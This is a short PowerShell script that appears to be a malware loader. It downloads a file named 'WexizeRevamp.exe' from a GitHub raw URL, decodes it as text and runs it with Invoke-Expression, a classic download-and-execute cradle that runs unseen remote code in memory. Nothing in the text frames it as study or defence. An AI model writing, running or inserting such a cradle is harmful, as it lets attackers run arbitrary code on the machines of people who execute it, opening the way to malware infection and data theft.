$url = "https://raw.githubusercontent.com/DemonT-T/fsda/refs/heads/main/WexizeRevamp.exe"

$wc = New-Object Net.WebClient
$data = $wc.DownloadData($url)

$script = [Text.Encoding]::UTF8.GetString($data)
Invoke-Expression $script
